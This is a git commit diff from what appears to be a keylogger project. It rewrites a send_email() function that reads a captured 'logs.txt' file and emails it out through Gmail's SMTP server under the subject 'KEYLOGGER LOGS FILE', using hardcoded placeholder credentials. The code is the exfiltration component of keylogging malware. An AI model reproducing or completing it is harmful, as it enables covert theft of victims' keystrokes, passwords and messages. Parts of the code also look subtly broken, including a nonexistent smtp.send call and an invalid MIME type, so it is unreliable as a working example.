bd7fe7a3004f15a41f691df13d6a96ae72bd86e1
brocode <kelimbth@gmail.com>
2023-10-16 14:37:28 +0300

    updated send_email() 1.) provided constant variables for email and password 2.) added comments for more description

--- mails/mail.py
+++ mails/mail.py
@@ -1,24 +1,25 @@
 from email.message import EmailMessage
 from getpass import getpass
 import smtplib
+import os
+
+EMAIL_ADDRESS = 'useremail@email.com'  # place your email here - use environment variable.
+EMAIL_PASSWORD = 'Strong_password@001010!'  # place your password here - use environment variable.
 
 def send_email():
-    user_email_addr = str(input('Enter your email: '))
-    user_email_pswd = getpass('Enter your email password: ')
-
     # template format for sent email
     message = EmailMessage()
     message["Subject"] = 'KEYLOGGER LOGS FILE'
-    message["From"] = user_email_addr
-    message["To"] = user_email_addr
+    message["From"] = EMAIL_ADDRESS   # sender
+    message["To"] = EMAIL_ADDRESS   # receiver
     message.set_content('Logs file (document) attached  ...')
 
     with open('logs.txt', 'rb') as f:
         file_data = f.read()
-        file_name = f.name
+        file_name, file_extension = os.path.splitext('logs.txt')
 
-    message.add_attachment(file_data, maintype='txt', filename=file_name)
+    message.add_attachment(file_data, maintype='txt', subtype=file_extension, filename=file_name)
 
     with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
-        smtp.login(user=user_email_addr, password=user_email_pswd)
+        smtp.login(user=EMAIL_ADDRESS, password=EMAIL_PASSWORD)
         smtp.send(message)
